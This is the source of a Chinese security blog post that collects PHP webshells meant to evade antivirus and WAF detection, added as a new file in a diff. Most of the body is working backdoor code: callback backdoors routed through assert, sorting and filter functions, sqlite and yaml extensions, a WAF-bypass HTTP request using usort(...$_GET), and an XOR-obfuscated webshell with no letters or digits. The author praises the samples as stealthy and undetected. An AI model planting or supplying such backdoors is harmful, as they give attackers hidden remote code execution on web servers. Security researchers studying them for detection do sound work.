@@ -1,0 +1,1181 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/favicon.ico?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="一些Webshell…">
+<meta name="keywords" content="Other">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Webshell一把梭">
+<meta property="og:url" content="https://p2hm1n.github.io/2019/06/09/Webshell一把梭/index.html">
+<meta property="og:site_name" content="ONE PIECE">
+<meta property="og:description" content="一些Webshell…">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://p2hm1n.github.io/2019/06/09/Webshell一把梭/1558772898145.png">
+<meta property="og:image" content="https://p2hm1n.github.io/2019/06/09/Webshell一把梭/Webshell%E4%B8%80%E6%8A%8A%E6%A2%AD/1.png">
+<meta property="og:image" content="https://p2hm1n.github.io/2019/06/09/Webshell一把梭/Webshell%E4%B8%80%E6%8A%8A%E6%A2%AD/2.png">
+<meta property="og:updated_time" content="2019-06-10T16:19:32.810Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Webshell一把梭">
+<meta name="twitter:description" content="一些Webshell…">
+<meta name="twitter:image" content="https://p2hm1n.github.io/2019/06/09/Webshell一把梭/1558772898145.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://p2hm1n.github.io/2019/06/09/Webshell一把梭/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Webshell一把梭 | ONE PIECE</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ONE PIECE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">P2hm1n's blog</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://p2hm1n.github.io/2019/06/09/Webshell一把梭/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P2hm1n">
+      <meta itemprop="description" content="ONE PIECE">
+      <meta itemprop="image" content="/images/lufei.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ONE PIECE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Webshell一把梭
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-06-09 21:38:40" itemprop="dateCreated datePublished" datetime="2019-06-09T21:38:40+08:00">2019-06-09</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-06-11 00:19:32" itemprop="dateModified" datetime="2019-06-11T00:19:32+08:00">2019-06-11</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Other/" itemprop="url" rel="index"><span itemprop="name">Other</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>一些Webshell…</p>
+<a id="more"></a>
+<h1 id="各类免杀webshell"><a href="#各类免杀webshell" class="headerlink" title="各类免杀webshell"></a>各类免杀webshell</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="phithon圈子里面的"><a href="#phithon圈子里面的" class="headerlink" title="phithon圈子里面的"></a>phithon圈子里面的</h3><p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
+<ul>
+<li><strong>利用PDO::FETCH_FUNC特性留后门</strong></li>
+</ul>
+<p>翻手册的时候发现fetch_argument的参数PDO::FETCH_FUNC可以回调一个函数，用这东西留个后门应该可以迷惑部分管理员。<br><strong>适用于：(PHP 5 &gt;= 5.1.0, PECL pdo &gt;= 0.1.0)。</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(($db = @<span class="keyword">new</span> PDO(<span class="string">'sqlite::memory:'</span>)) &amp;&amp; ($sql = strrev(<span class="string">'TSOP_'</span>)) &amp;&amp; ($sql = $$sql)) &#123;</span><br><span class="line">	$stmt = @$db-&gt;query(<span class="string">"SELECT '&#123;$sql[b4dboy]&#125;'"</span>);</span><br><span class="line">	$result = @$stmt-&gt;fetchAll(PDO::FETCH_FUNC, str_rot13(<span class="string">'nffreg'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+- **数组操作造成的单参数回调后门**
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'test'</span>, $_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line">uasort($arr, base64_decode($e));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./1558772898145.png" alt="Alt text"></p>
+<br>
+- **二参数回调函数**
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">同样的道理，这个也是功能类似：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'test'</span> =&gt; <span class="number">1</span>, $_REQUEST[<span class="string">'pass'</span>] =&gt; <span class="number">2</span>);</span><br><span class="line">uksort($arr, $e);</span><br><span class="line">再给出这两个函数，面向对象的方法：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// way 0</span></span><br><span class="line">$arr = <span class="keyword">new</span> ArrayObject(<span class="keyword">array</span>(<span class="string">'test'</span>, $_REQUEST[<span class="string">'pass'</span>]));</span><br><span class="line">$arr-&gt;uasort(<span class="string">'assert'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// way 1</span></span><br><span class="line">$arr = <span class="keyword">new</span> ArrayObject(<span class="keyword">array</span>(<span class="string">'test'</span> =&gt; <span class="number">1</span>, $_REQUEST[<span class="string">'pass'</span>] =&gt; <span class="number">2</span>));</span><br><span class="line">$arr-&gt;uksort(<span class="string">'assert'</span>);</span><br><span class="line">再来两个类似的回调后门：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">array_reduce($arr, $e, $_POST[<span class="string">'pass'</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'pass'</span>]);</span><br><span class="line">$arr2 = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">array_udiff($arr, $arr2, $e);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>三参数回调函数</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'pass'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line">array_walk_recursive($arr, $e, <span class="string">''</span>);</span><br><span class="line">不截图了。</span><br><span class="line"></span><br><span class="line">看了以上几个回调后门，发现preg_replace确实好用。但显然很多WAF和顿顿狗狗的早就盯上这个函数了。其实php里不止这个函数可以执行<span class="keyword">eval</span>的功能，还有几个类似的：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mb_ereg_replace(<span class="string">'.*'</span>, $_REQUEST[<span class="string">'pass'</span>], <span class="string">''</span>, <span class="string">'e'</span>);</span><br><span class="line">另一个：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_filter(<span class="string">'|.*|e'</span>, $_REQUEST[<span class="string">'pass'</span>], <span class="string">''</span>);</span><br><span class="line">这两个一句话都是不杀的：</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>无回显回调后门</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start(<span class="string">'assert'</span>);</span><br><span class="line"><span class="keyword">echo</span> $_REQUEST[<span class="string">'pass'</span>];</span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>单参数后门终极奥义</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">register_shutdown_function($e, $_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line"></span><br><span class="line">再来一个：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line">再来两个：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var($_REQUEST[<span class="string">'pass'</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">'options'</span> =&gt; <span class="string">'assert'</span>));</span><br><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">'test'</span> =&gt; $_REQUEST[<span class="string">'pass'</span>]), <span class="keyword">array</span>(<span class="string">'test'</span> =&gt; <span class="keyword">array</span>(<span class="string">'filter'</span> =&gt; FILTER_CALLBACK, <span class="string">'options'</span> =&gt; <span class="string">'assert'</span>)));</span><br><span class="line">这两个是filter_var的利用，php里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可。</span><br><span class="line"></span><br><span class="line">这几个单参数回调后门非常隐蔽，基本没特征，用起来很<span class="number">6.</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>数据库操作与第三方库中的回调后门</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">我们可以注册一个sqlite函数，使之与assert功能相同。当执行这个sql语句的时候，就等于执行了assert。所以这个后门我这样构造：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$db = <span class="keyword">new</span> PDO(<span class="string">'sqlite:sqlite.db3'</span>);</span><br><span class="line">$db-&gt;sqliteCreateFunction(<span class="string">'myfunc'</span>, $e, <span class="number">1</span>);</span><br><span class="line">$sth = $db-&gt;prepare(<span class="string">"SELECT myfunc(:exec)"</span>);</span><br><span class="line">$sth-&gt;execute(<span class="keyword">array</span>(<span class="string">':exec'</span> =&gt; $_REQUEST[<span class="string">'pass'</span>]));</span><br><span class="line"></span><br><span class="line">上面的sqlite方法是依靠PDO执行的，我们也可以直接调用sqlite3的方法构造回调后门：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$db = <span class="keyword">new</span> SQLite3(<span class="string">'sqlite.db3'</span>);</span><br><span class="line">$db-&gt;createFunction(<span class="string">'myfunc'</span>, $e);</span><br><span class="line">$stmt = $db-&gt;prepare(<span class="string">"SELECT myfunc(?)"</span>);</span><br><span class="line">$stmt-&gt;bindValue(<span class="number">1</span>, $_REQUEST[<span class="string">'pass'</span>], SQLITE3_TEXT);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">前提是php5<span class="number">.3</span>以上。如果是php5<span class="number">.3</span>以下的，使用sqlite_*函数，自己研究我不列出了。</span><br><span class="line"></span><br><span class="line">这两个回调后门，都是依靠php扩展库（pdo和sqlite3）来实现的。其实如果目标环境中有特定扩展库的情况下，也可以来构造回调后门。</span><br><span class="line"></span><br><span class="line">比如php_yaml：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = urlencode($_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line">$yaml = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">greeting: !<span class="subst">&#123;$str&#125;</span> "|.+|e"</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">$parsed = yaml_parse($yaml, <span class="number">0</span>, $cnt, <span class="keyword">array</span>(<span class="string">"!&#123;$_REQUEST['pass']&#125;"</span> =&gt; <span class="string">'preg_replace'</span>));</span><br><span class="line">还有php_memcached：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mem = <span class="keyword">new</span> Memcache();</span><br><span class="line">$re = $mem-&gt;addServer(<span class="string">'localhost'</span>, <span class="number">11211</span>, <span class="keyword">TRUE</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="keyword">TRUE</span>, create_function(<span class="string">'$a,$b,$c,$d,$e'</span>, <span class="string">'return assert($a);'</span>));</span><br><span class="line">$mem-&gt;connect($_REQUEST[<span class="string">'pass'</span>], <span class="number">11211</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>其他参数型回调后门</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">上面说了，回调函数格式为<span class="number">1</span>、<span class="number">2</span>、<span class="number">3</span>参数的时候，可以利用assert、assert、preg_replace来执行代码。但如果回调函数的格式是其他参数数目，或者参数类型不是简单字符串，怎么办？</span><br><span class="line"></span><br><span class="line">举个例子，php5<span class="number">.5</span>以后建议用preg_replace_callback代替preg_replace的/e模式来处理正则执行替换，那么其实preg_replace_callback也是可以构造回调后门的。</span><br><span class="line"></span><br><span class="line">preg_replace_callback的第二个参数是回调函数，但这个回调函数被传入的参数是一个数组，如果直接将这个指定为assert，就会执行不了，因为assert接受的参数是字符串。</span><br><span class="line"></span><br><span class="line">所以我们需要去“构造”一个满足条件的回调函数。</span><br><span class="line"></span><br><span class="line">怎么构造？使用create_function：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace_callback(<span class="string">'/.+/i'</span>, create_function(<span class="string">'$arr'</span>, <span class="string">'return assert($arr[0]);'</span>), $_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line">“创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[<span class="number">0</span>]传入assert。</span><br><span class="line"></span><br><span class="line">这也是一个不杀不报稳定执行的回调后门，但因为有create_function这个敏感函数，所以看起来总是不太爽。不过也是没办法的事。</span><br><span class="line"></span><br><span class="line">类似的，这个也同样：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mb_ereg_replace_callback(<span class="string">'.+'</span>, create_function(<span class="string">'$arr'</span>, <span class="string">'return assert($arr[0]);'</span>), $_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line">再来一个利用CallbackFilterIterator方法的回调后门：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$iterator = <span class="keyword">new</span> CallbackFilterIterator(<span class="keyword">new</span> ArrayIterator(<span class="keyword">array</span>($_REQUEST[<span class="string">'pass'</span>],)), create_function(<span class="string">'$a'</span>, <span class="string">'assert($a);'</span>));</span><br><span class="line"><span class="keyword">foreach</span> ($iterator <span class="keyword">as</span> $item) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $item;</span><br><span class="line">&#125;</span><br><span class="line">这里也是借用了create_function来创建回调函数。但有些同学就问了，这里创建的回调函数只有一个参数呀？实际上这里如果传入assert，是会报错的，具体原因自己分析。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>无视任何waf</strong></li>
+</ul>
+<p><strong>这个代码怎么拿到webshell？</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$param = $_REQUEST[<span class="string">'param'</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($param)&lt;<span class="number">17</span> &amp;&amp; stripos($param,<span class="string">'eval'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($param,<span class="string">'assert'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($param);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Answer</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php?<span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=var_dump($_SERVER);&amp;<span class="number">2</span>=assert HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8081</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 22</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">param=usort(...$_GET);</span></span><br></pre></td></tr></table></figure>
+
+<p><br><br></p>
+<h1 id="无字母数字webshell"><a href="#无字母数字webshell" class="headerlink" title="无字母数字webshell"></a>无字母数字webshell</h1><blockquote>
+<p>来源phithon代码圈</p>
+</blockquote>
+<h2 id="一些不包含数字和字母的webshell"><a href="#一些不包含数字和字母的webshell" class="headerlink" title="一些不包含数字和字母的webshell"></a>一些不包含数字和字母的webshell</h2><p><strong>如何利用以下代码？</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>php5和7的差异。</p>
+<p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...)</code>;这样的方法来动态执行任意代码。</p>
+<p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p>
+</blockquote>
+<h3 id="位运算里的“异或”"><a href="#位运算里的“异或”" class="headerlink" title="位运算里的“异或”"></a>位运算里的“异或”</h3><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//url编码表示</span></span><br><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); <span class="comment">// $_='assert';</span></span><br><span class="line">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__='_POST';</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>
+
